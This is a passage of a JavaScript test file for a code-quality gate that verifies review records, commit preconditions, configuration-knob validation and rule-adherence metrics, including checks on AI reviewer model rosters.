  it("refuses on a stale report", () => {
    const result = evaluatePreconditions({ report, routing: { tier: TIER.AUTO }, currentHash: "changed", review: { found: true }, mode: "full" })
    assert.equal(result.ok, false)
    assert.match(result.problems.join(" "), /not credible/)
  })

  it("refuses when there is no report at all", () => {
    const result = evaluatePreconditions({ report: null, routing: null, currentHash: "x", review: null, mode: "full" })
    assert.equal(result.ok, false)
  })

  it("passes a fresh green full report at a tier that needs no review record", () => {
    const result = evaluatePreconditions({ report, routing: { tier: TIER.AUTO }, currentHash: "deadbeef", review: { found: true }, mode: "full" })
    assert.equal(result.ok, true)
  })
})

describe("findReviewFor — the review must name the change it reviewed", () => {
  it("accepts only a review citing the report's source hash", () => {
    const root = fs.mkdtempSync(path.join(os.tmpdir(), "harness-review-"))
    try {
      fs.mkdirSync(path.join(root, "docs", "harness", "review"), { recursive: true })
      fs.writeFileSync(path.join(root, "docs", "harness", "review", "old.md"), "Verdict: APPROVE\nreview of an unrelated change\n")
      const report = { sourceHash: "cafebabe" }
      assert.equal(findReviewFor(root, report).found, false, "an approving review of a DIFFERENT change does not count")

      // Citing the change is necessary and not sufficient — this stub names the hash but approves
      // nothing, which is the second half of the hole (review R4 critical 2).
      fs.writeFileSync(path.join(root, "docs", "harness", "review", "stub.md"), "reviewed gate report cafebabe\n")
      assert.equal(findReviewFor(root, report).found, false, "citing the hash without a verdict is not a review")

      fs.writeFileSync(path.join(root, "docs", "harness", "review", "current.md"), "Verdict: APPROVE\ngate report cafebabe\n")
      assert.equal(findReviewFor(root, report).found, true)
    } finally {
      fs.rmSync(root, { recursive: true, force: true })
    }
  })

  it("rejects a --review path outside the repository (review R5 finding 2)", () => {
    // An absolute or ../.. path let a never-committed file in the system temp dir satisfy the
    // tier-full precondition — the same confinement `coverage_artifact` already had.
    const root = fs.mkdtempSync(path.join(os.tmpdir(), "harness-review-"))
    const outside = path.join(os.tmpdir(), `outside-${process.pid}.md`)
    try {
      fs.writeFileSync(outside, "Verdict: APPROVE\ngate report cafebabe\n")
      const result = findReviewFor(root, { sourceHash: "cafebabe" }, outside)
      assert.equal(result.found, false)
      assert.match(result.reason, /outside the repository/)
    } finally {
      fs.rmSync(outside, { force: true })
      fs.rmSync(root, { recursive: true, force: true })
    }
  })

  it("rejects an explicit --review path that does not reference the report", () => {
    const root = fs.mkdtempSync(path.join(os.tmpdir(), "harness-review-"))
    try {
      fs.writeFileSync(path.join(root, "review.md"), "some other review\n")
      const result = findReviewFor(root, { sourceHash: "cafebabe" }, "review.md")
      assert.equal(result.found, false)
      assert.match(result.reason, /does not reference/)
    } finally {
      fs.rmSync(root, { recursive: true, force: true })
    }
  })
})

describe("renderTrailer", () => {
  it("carries the source hash so history can be re-checked", () => {
    const trailer = renderTrailer({
      report: { verdict: "pass", mode: "full", sourceHash: "deadbeef", rows: [{ metric: "regression_suite", status: "pass", value: 0 }] },
      reportFile: path.join("docs", "harness", "quality", "r.json"),
      routing: { tier: TIER.AUTO },
    })
    assert.match(trailer, /Quality-Gate: pass \(full\)/)
    assert.match(trailer, /Metrics: regression=0/)
    assert.match(trailer, /Source-Hash: deadbeef/)
  })
})

describe("checkSources — invariant 13 has a live guard", () => {
  it("finds no prose thresholds in this harness", () => {
    // Root derived from this file, not cwd: `checkSources(process.cwd())` passed vacuously when
    // the suite ran from another directory.
    const findings = checkSources(REPO_ROOT)
    assert.deepEqual(findings, [], `prose thresholds reintroduced: ${JSON.stringify(findings)}`)
  })
})

// ---------------------------------------------------------------------------
// SEC-R2 fixtures: security M4 (knobs at read time) and code-review W2/W3

const GATE_SCRIPT = path.join(REPO_ROOT, "scripts", "harness-quality-gate.mjs")
const GATE_CONSUMED_KNOBS = { stage1_window_runs: 30, enforced_fraction_min_runs: 3 }

function tempRoot(prefix = "harness-gate-") {
  return fs.mkdtempSync(path.join(os.tmpdir(), prefix))
}

function write(root, relative, content) {
  const target = path.join(root, relative)
  fs.mkdirSync(path.dirname(target), { recursive: true })
  fs.writeFileSync(target, content, "utf8")
  return target
}

function writeThresholds(root, thresholds) {
  write(root, "agent-os/quality-thresholds.json", JSON.stringify(thresholds, null, 2))
}

function runGateCli(args, { root } = {}) {
  return spawnSync(process.execPath, [GATE_SCRIPT, ...(root ? ["--project", root] : []), ...args], { encoding: "utf8" })
}

// The base thresholds shape for a repo that INSTALLED the learned_rules feature. Each
// call must return a FRESH copy: the mutation tests below delete and overwrite knobs,
// and a shared object would leak those edits into every later test in the process.
const installedBase = () => ({
  phase: "A",
  metrics: {},
  suites: {},
  commands: {},
  learned_rules: { ...GATE_CONSUMED_KNOBS },
})

describe("learned_rules read-time validation — exit 2, never a default (security M4, review B12)", () => {
  it("validates the installed feature's knobs at gate read time (pure)", () => {
    assert.deepEqual(validateLearnedRulesKnobs({ phase: "A" }), { ok: true, installed: false, errors: [] })
    assert.equal(validateLearnedRulesKnobs(installedBase()).ok, true)
    assert.equal(validateLearnedRulesKnobs(installedBase()).installed, true)
  })

  it("refuses a partially-declared feature missing a gate-consumed knob (pure)", () => {
    const partial = installedBase()
    delete partial.learned_rules.stage1_window_runs
    const result = validateLearnedRulesKnobs(partial)
    assert.equal(result.ok, false)
    assert.match(result.errors.join(" "), /stage1_window_runs is missing/)
  })

  it("refuses an out-of-range knob through the exported validator (pure)", () => {
    const bad = installedBase()
    bad.learned_rules.operator_note_weight = 0
    const result = validateLearnedRulesKnobs(bad)
    assert.equal(result.ok, false)
    assert.match(result.errors.join(" "), /operator_note_weight/)
  })

  it("refuses an unknown knob — a control with no range row (pure)", () => {
    const bad = installedBase()
    bad.learned_rules.shiny_new_knob = 1
    assert.equal(validateLearnedRulesKnobs(bad).ok, false)
  })

  it("exits 2 from the CLI when the installed feature is missing a gate knob", () => {
    const root = tempRoot()
    const partial = installedBase()
    delete partial.learned_rules.enforced_fraction_min_runs
    writeThresholds(root, partial)
    const result = runGateCli(["--mode", "local", "--no-project-commands"], { root })
    assert.equal(result.status, 2, result.stderr)
    assert.match(result.stderr, /enforced_fraction_min_runs is missing/)
    assert.match(result.stderr, /harness blocker/)
  })

  it("exits 2 from the CLI on an out-of-range knob, never a default", () => {
    const root = tempRoot()
    const bad = installedBase()
    bad.learned_rules.stage1_window_runs = 0
    writeThresholds(root, bad)
    const result = runGateCli(["--mode", "local", "--no-project-commands"], { root })
    assert.equal(result.status, 2, result.stderr)
    assert.match(result.stderr, /stage1_window_runs/)
  })

  it("does NOT block a repo with no learned_rules feature installed", () => {
    const root = tempRoot()
    writeThresholds(root, { phase: "A", metrics: {}, suites: {}, commands: {} })
    const result = runGateCli(["--mode", "local", "--no-project-commands"], { root })
    assert.notEqual(result.status, 2, result.stderr)
  })

  it("does NOT block a fully installed feature (gate runs, exit 0 with no metrics)", () => {
    const root = tempRoot()
    writeThresholds(root, installedBase())
    const result = runGateCli(["--mode", "local", "--no-project-commands"], { root })
    assert.equal(result.status, 0, result.stderr)
  })
})

describe("adherence counts — candidates are not rules (code-review W3, D7)", () => {
  // A window + ledger fixture proving `rules_active` and `enforced_fraction` count only
  // `status === "active"`. The candidate must not inflate either side of the fraction,
  // and prose_permanent stays excluded from the denominator.
  const HASH = "deadbeefdeadbeef"

  function adapterRoot() {
    const root = tempRoot("harness-adherence-")
    writeThresholds(root, {
      phase: "A",
      metrics: {},
      learned_rules: { ...GATE_CONSUMED_KNOBS, citation_competence_min_samples: 3 },
    })
    write(
      root,
      "docs/harness/findings/2026-08-12T00-00-00-full.json",
      JSON.stringify({
        run: { label: "scheduler", tier: "full", gate_report: "docs/harness/quality/r.json", gate_source_hash: HASH },
        roster: [{ reviewer: "code-reviewer", model: "opencode-go/deepseek-v4-flash", sample: false }],
        findings: [],
      }),
    )
    return root
  }

  const rule = (overrides = {}) => ({
    id: "r1",
    text: "Server state lives in the store.",
    target: "agent-os/standards/vue.md",
    anchor: "server-state-in-store",
    enforcement: "prose",
    status: "active",
    stats: { runs_since_approval: 5 },
    ...overrides,
  })

  it("counts only active rules in rules_active and both sides of enforced_fraction", () => {
    const root = adapterRoot()
    write(
      root,
      "agent-os/learned-rules.json",
      JSON.stringify({
        version: 2,
        rules: [
          rule({ id: "r-lint", enforcement: "lint" }),
          rule({ id: "r-prose" }),
          rule({ id: "r-permanent", enforcement: "lint", prose_permanent: true }),
          rule({ id: "r-candidate", enforcement: "lint", status: "candidate" }),
          rule({ id: "r-young", enforcement: "lint", stats: { runs_since_approval: 1 } }),
        ],
        conflicts: [],
        retired: [],
      }),
    )
    const rows = adherenceAdapter({ root, thresholds: { metrics: {}, learned_rules: GATE_CONSUMED_KNOBS } }, { mode: "full", reportSourceHash: HASH })

    // Active rules: r-lint, r-prose, r-permanent, r-young = 4. The candidate must not
    // inflate the working-set row (it would read 5).
    assert.equal(rows.rules_active.value, 4, "candidates must not inflate rules_active")
    // Aged active non-permanent: r-lint, r-prose = 2. Numerator: r-lint = 1.
    assert.equal(rows.enforced_fraction.value, 0.5, "candidates must not inflate the denominator or the numerator")
    assert.match(rows.enforced_fraction.detail, /1\/2 enforced/)
    assert.match(rows.enforced_fraction.detail, /1 permanently-prose rule\(s\) excluded/)
    assert.match(rows.enforced_fraction.detail, /rules_active 4/)
  })

  it("is unavailable when every aged rule is a candidate — candidates do not fabricate a ratio", () => {
    const root = adapterRoot()
    write(
      root,
      "agent-os/learned-rules.json",
      JSON.stringify({
        version: 2,
        rules: [rule({ id: "r-candidate", enforcement: "lint", status: "candidate" })],
        conflicts: [],
        retired: [],
      }),
    )
    const rows = adherenceAdapter({ root, thresholds: { metrics: {}, learned_rules: GATE_CONSUMED_KNOBS } }, { mode: "full", reportSourceHash: HASH })
    assert.equal(rows.rules_active.value, 0, "no active rules — a candidate is not a rule")
    assert.match(rows.enforced_fraction.unavailable, /no active rules old enough to count/)
  })
})

describe("an unavailable configured metric row cannot route auto (code-review W2)", () => {
  const low = { level: "low", score: 0, reasons: [] }
  const fullGreen = (rows) => ({ credible: true, report: { mode: "full", rows } })

  it("routes a full green report with an unavailable row to sampling, never auto", () => {
    const result = resolveTier({
      risk: RISK.LOW,
      complexity: low,
      gate: fullGreen([{ metric: "security_findings", status: "unavailable" }, { metric: "regression_suite", status: "pass" }]),
    })
    assert.equal(result.tier, TIER.SAMPLING)
    assert.match(result.why, /unavailable/)
    assert.match(result.why, /security_findings/)
  })

  it("still grants auto when every configured metric row was measured and passed", () => {
    const result = resolveTier({
      risk: RISK.LOW,
      complexity: low,
      gate: fullGreen([{ metric: "security_findings", status: "pass" }, { metric: "regression_suite", status: "pass" }]),
    })
    assert.equal(result.tier, TIER.AUTO)
  })

  it("keeps missing/stale reports at full — unavailable is not the only fail-closed input", () => {
    const result = resolveTier({ risk: RISK.LOW, complexity: low, gate: { credible: false, reason: "report is stale" } })
    assert.equal(result.tier, TIER.FULL)
  })
})

describe("ship evidence — a blocking metric unavailable refuses the commit gate (code-review W2)", () => {
  const reportWith = (row) => ({
    verdict: "pass",
    mode: "full",
    sourceHash: "deadbeef",
    rows: [row],
  })

  it("refuses when a blocking-mode metric row is unavailable", () => {
    const result = evaluatePreconditions({
      report: reportWith({ metric: "regression_suite", status: "unavailable", mode: "blocking" }),
      routing: { tier: TIER.AUTO },
      currentHash: "deadbeef",
      review: { found: true },
      mode: "full",
    })
    assert.equal(result.ok, false)
    assert.match(result.problems.join(" "), /blocking metric unavailable/)
    assert.match(result.problems.join(" "), /regression_suite/)
  })

  it("does not refuse an unavailable observe-mode row — the exit code already says what it means", () => {
    const result = evaluatePreconditions({
      report: reportWith({ metric: "security_findings", status: "unavailable", mode: "observe" }),
      routing: { tier: TIER.AUTO },
      currentHash: "deadbeef",
      review: { found: true },
      mode: "full",
    })
    assert.equal(result.ok, true)
  })

  it("does not refuse an unavailable row that carries no mode (legacy reports)", () => {
    const result = evaluatePreconditions({
      report: reportWith({ metric: "line_coverage", status: "unavailable" }),
      routing: { tier: TIER.AUTO },
      currentHash: "deadbeef",
      review: { found: true },
      mode: "full",
    })
    assert.equal(result.ok, true)
  })
})

// ---------------------------------------------------------------------------
// FINAL-R1 fixtures: verification table A14/A15/A16/A17/A18 + the same-model
// liveness guard (objective 7). A14-A18 are named after the verification table's
// rows; each case guards a specific finding.

const FINAL_HASH = "deadbeefdeadbeef"
const FINAL_KNOBS = { stage1_window_runs: 30, enforced_fraction_min_runs: 3, citation_competence_min_samples: 3 }

function finalStandards(root) {
  write(
    root,
    "agent-os/standards/vue.md",
    [
      "# Vue Standard",
      "",
      "## Server State in Store",
      "",
      "<!-- anchor: server-state-in-store -->",
      "",
      "- Keep server state in the store.",
      "",
      "## Error Shape in Provider",
      "",
      "<!-- anchor: error-shape-in-provider -->",
      "",
      "- Error shape lives in the provider layer.",
      "",
    ].join("\n"),
  )
}

const finalViolation = (overrides = {}) => ({
  id: "v-1",
  file: "src/app.vue",
  line: 42,
  class: "rule_violation",
  rule: "agent-os/standards/vue.md#server-state-in-store",
  severity: "major",
  lane: "T01",
  capability: "vue-engineer",
  model: "opencode-go/deepseek-v4-flash",
  changed_lines_in_lane: 214,
  summary: "server state in a composable ref",
  ...overrides,
})

function finalFindingsFile(root, name, { tier = "full", hash = FINAL_HASH, roster, findings, session } = {}) {
  write(
    root,
    `docs/harness/findings/${name}`,
    JSON.stringify({
      run: {
        label: "scheduler",
        tier,
        gate_report: "docs/harness/quality/r.json",
        gate_source_hash: hash,
        ...(session ? { session } : {}),
      },
      roster,
      findings,
    }),
  )
}

function finalLedger(root, rules) {
  write(root, "agent-os/learned-rules.json", JSON.stringify({ version: 2, rules, conflicts: [], retired: [] }))
}

function finalAdherence(root, { metrics = {}, git, knobs = FINAL_KNOBS } = {}) {
  return adherenceAdapter(
    { root, thresholds: { metrics, learned_rules: knobs } },
    { mode: "full", reportSourceHash: FINAL_HASH, ...(git ? { git } : {}) },
  )
}

describe("A14 — prose cannot block: records route by enforcement, prose lands only in the observe row (review B7, invariant 19)", () => {
  function proseRoutingRoot() {
    const root = tempRoot("harness-a14-")
    writeThresholds(root, { phase: "A", metrics: {}, learned_rules: { ...FINAL_KNOBS } })
    finalStandards(root)
    finalLedger(root, [
      { id: "r-lint", text: "error shape in provider", target: "agent-os/standards/vue.md", anchor: "error-shape-in-provider", enforcement: "lint", status: "active" },
      { id: "r-prose", text: "server state in store", target: "agent-os/standards/vue.md", anchor: "server-state-in-store", enforcement: "prose", status: "active" },
    ])
    finalFindingsFile(root, "2026-08-12T00-00-00-full.json", {
      roster: [{ reviewer: "code-reviewer", model: "opencode-go/deepseek-v4-flash", sample: false }],
      findings: [
        finalViolation({ id: "v-prose" }),
        finalViolation({ id: "v-lint", rule: "agent-os/standards/vue.md#error-shape-in-provider" }),
      ],
    })
    return root
  }

  it("routes the prose-backed violation to the prose row and the lint-backed one to the enforced row", () => {
    const rows = finalAdherence(proseRoutingRoot())
    assert.equal(rows.rule_violations_prose.value, 1)
    assert.match(rows.rule_violations_prose.detail, /prose × 1/)
    assert.equal(rows.rule_violations_enforced.value, 1)
    assert.match(rows.rule_violations_enforced.detail, /promotion-backed lint × 1/)
    // The prose citation contributes to NO other row: the enforced count is only the lint record.
    assert.doesNotMatch(rows.rule_violations_enforced.detail, /prose-routed|prose ×/)
  })
})

describe("A15 — the prose row is pinned to observe; flipping the config is refused (invariant 19, review B7)", () => {
  function proseRoutingRoot() {
    const root = tempRoot("harness-a15-")
    writeThresholds(root, { phase: "A", metrics: {}, learned_rules: { ...FINAL_KNOBS } })
    finalStandards(root)
    finalLedger(root, [
      { id: "r-prose", text: "server state in store", target: "agent-os/standards/vue.md", anchor: "server-state-in-store", enforcement: "prose", status: "active" },
    ])
    finalFindingsFile(root, "2026-08-12T00-00-00-full.json", {
      roster: [{ reviewer: "code-reviewer", model: "opencode-go/deepseek-v4-flash", sample: false }],
      findings: [finalViolation({ id: "v-prose" })],
    })
    return root
  }

  it("flipping rule_violations_prose to blocking makes the adapter refuse the reading, regardless of config", () => {
    const rows = finalAdherence(proseRoutingRoot(), { metrics: { rule_violations_prose: { mode: "blocking" } } })
    assert.match(rows.rule_violations_prose.unavailable, /pinned to observe, permanently/)
  })
})

describe("A16 — enforced_fraction edges: unavailable, never 0 or 1 (review M1)", () => {
  const agedRule = (overrides = {}) => ({
    id: "r-old",
    text: "rule",
    target: "agent-os/standards/vue.md",
    anchor: "server-state-in-store",
    enforcement: "prose",
    status: "active",
    stats: { runs_since_approval: 5 },
    ...overrides,
  })

  function fractionRoot(rules) {
    const root = tempRoot("harness-a16-")
    writeThresholds(root, { phase: "A", metrics: {}, learned_rules: { ...FINAL_KNOBS } })
    finalStandards(root)
    if (rules) finalLedger(root, rules)
    finalFindingsFile(root, "2026-08-12T00-00-00-full.json", {
      roster: [{ reviewer: "code-reviewer", model: "opencode-go/deepseek-v4-flash", sample: false }],
      findings: [],
    })
    return root
  }

  it("a missing ledger is unavailable, never 0 (T07 §3)", () => {
    const rows = finalAdherence(fractionRoot(null))
    assert.match(rows.enforced_fraction.unavailable, /no agent-os\/learned-rules.json/)
  })

  it("retiring a young prose rule leaves the fraction unchanged — retirement is neutral", () => {
    const withYoung = finalAdherence(
      fractionRoot([
        agedRule({ id: "r-lint", enforcement: "lint" }),
        agedRule({ id: "r-prose" }),
        agedRule({ id: "r-young", enforcement: "prose", stats: { runs_since_approval: 1 } }),
      ]),
    )
    const withoutYoung = finalAdherence(fractionRoot([agedRule({ id: "r-lint", enforcement: "lint" }), agedRule({ id: "r-prose" })]))
    assert.equal(withYoung.enforced_fraction.value, 0.5)
    assert.equal(withoutYoung.enforced_fraction.value, 0.5)
  })

  it("a ratchet with threshold null is unavailable — no baseline may be seeded from a null-bar run (review M1)", () => {
    const rows = finalAdherence(fractionRoot([agedRule({ id: "r-lint", enforcement: "lint" })]), {
      metrics: { enforced_fraction: { ratchet: true, threshold: null, direction: "min" } },
    })
    assert.match(rows.enforced_fraction.unavailable, /ratcheted with threshold null/)
  })
})

describe("A17 — a violation count printed with no recall estimate fails this test (invariant 20, T07-R1)", () => {
  function violationRoot() {
    const root = tempRoot("harness-a17-")
    writeThresholds(root, { phase: "A", metrics: {}, learned_rules: { ...FINAL_KNOBS } })
    finalStandards(root)
    finalLedger(root, [
      { id: "r-prose", text: "server state in store", target: "agent-os/standards/vue.md", anchor: "server-state-in-store", enforcement: "prose", status: "active" },
    ])
    finalFindingsFile(root, "2026-08-12T00-00-00-full.json", {
      roster: [{ reviewer: "code-reviewer", model: "opencode-go/deepseek-v4-flash", sample: false }],
      findings: [finalViolation({ id: "v-prose" })],
    })
    return root
  }

  it("every violation-derived adapter row carries the recall annotation", () => {
    const rows = finalAdherence(violationRoot())
    assert.equal(hasRecallAnnotation(rows.rule_violations_prose), true)
    assert.equal(hasRecallAnnotation(rows.rule_violations_enforced), true)
  })

  it("renderTable prints the recall annotation on PASS rows that carry it and keeps unrelated PASS rows compact", () => {
    const table = renderTable([
      {
        metric: "rule_violations_prose",
        value: 1,
        threshold: null,
        direction: "max",
        ratchet: false,
        mode: "observe",
        detail: "prose-routed prose × 1 · counted 1 file(s) at tier full · recall estimate 0.5 — relative to the paid reviewer, not absolute",
        status: "pass",
      },
      {
        metric: "rules_active",
        value: 2,
        threshold: null,
        direction: null,
        ratchet: false,
        mode: "observe",
        detail: "observation row — active rules only",
        status: "pass",
      },
    ])
    assert.match(table, /recall estimate 0\.5/)
    assert.doesNotMatch(table, /observation row — active rules only/, "unrelated PASS rows stay compact")
    assert.doesNotMatch(table, /null/, "a null threshold must not render as a literal null comparison")
  })
})

describe("A18 — cross-tier comparison is refused and the report says so (T07 §6)", () => {
  it("counts only the newest file's tier and states the exclusion", () => {
    const root = tempRoot("harness-a18-")
    writeThresholds(root, { phase: "A", metrics: {}, learned_rules: { ...FINAL_KNOBS } })
    finalStandards(root)
    finalLedger(root, [
      { id: "r-prose", text: "server state in store", target: "agent-os/standards/vue.md", anchor: "server-state-in-store", enforcement: "prose", status: "active" },
    ])
    finalFindingsFile(root, "2026-08-11T00-00-00-sampling.json", {
      tier: "sampling",
      hash: "cafebabecafebabe",
      roster: [{ reviewer: "code-reviewer", model: "opencode-go/deepseek-v4-flash", sample: false }],
      findings: [finalViolation({ id: "v-other" })],
    })
    finalFindingsFile(root, "2026-08-12T00-00-00-full.json", {
      roster: [{ reviewer: "code-reviewer", model: "opencode-go/deepseek-v4-flash", sample: false }],
      findings: [finalViolation({ id: "v-now" })],
    })
    const git = fakeGit({ "log --format=%B": "Subject\n\nSource-Hash: cafebabecafebabe\n" })
    const rows = finalAdherence(root, { git })
    // The sampling file's violation is excluded: only the newest full-tier record counts.
    assert.equal(rows.rule_violations_prose.value, 1)
    assert.match(rows.rule_violations_prose.detail, /1 file\(s\) of another tier excluded — cross-tier comparison refused/)
  })
})

describe("FINAL-R1 — a same-model paid/cheap roster is unavailable, never a measured value (objective 7)", () => {
  it("both liveness rows are unavailable when paid and cheap share one model", () => {
    const root = tempRoot("harness-liveness-")
    writeThresholds(root, { phase: "A", metrics: {}, learned_rules: { ...FINAL_KNOBS } })
    finalStandards(root)
    finalFindingsFile(root, "2026-08-12T00-00-00-full.json", {
      roster: [
        { reviewer: "code-reviewer", model: "opencode-go/deepseek-v4-flash", sample: false },
        { reviewer: "paid-reviewer", model: "opencode-go/deepseek-v4-flash", sample: true },
      ],
      findings: [finalViolation({ id: "v-1" })],
    })
    const rows = finalAdherence(root)
    assert.match(rows.citation_competence.unavailable, /share one model/)
    assert.match(rows.reviewer_recall_estimate.unavailable, /share one model/)
  })

  it("a single-entry roster with sample: true is the same case — the cheap fallback IS the paid entry", () => {
    const root = tempRoot("harness-liveness-")
    writeThresholds(root, { phase: "A", metrics: {}, learned_rules: { ...FINAL_KNOBS } })
    finalStandards(root)
    finalFindingsFile(root, "2026-08-12T00-00-00-full.json", {
      roster: [{ reviewer: "paid-reviewer", model: "openai/gpt-5.6-sol", sample: true }],
      findings: [finalViolation({ id: "v-1", model: "openai/gpt-5.6-sol" })],
    })
    const rows = finalAdherence(root)
    assert.match(rows.citation_competence.unavailable, /share one model/)
    assert.match(rows.reviewer_recall_estimate.unavailable, /share one model/)
  })

  it("a distinct-model roster still measures liveness — the guard does not over-fire", () => {
    const root = tempRoot("harness-liveness-")
    writeThresholds(root, { phase: "A", metrics: {}, learned_rules: { ...FINAL_KNOBS } })
    finalStandards(root)
    finalFindingsFile(root, "2026-08-12T00-00-00-full.json", {
      roster: [
        { reviewer: "code-reviewer", model: "opencode-go/deepseek-v4-flash", sample: false },
        { reviewer: "paid-reviewer", model: "openai/gpt-5.6-sol", sample: true },
      ],
      findings: [
        finalViolation({ id: "v-cheap" }),
        finalViolation({ id: "v-paid", model: "openai/gpt-5.6-sol" }),
      ],
    })
    const rows = finalAdherence(root)
    assert.equal(rows.citation_competence.value, 1)
    assert.equal(rows.reviewer_recall_estimate.value, 1)
  })
})
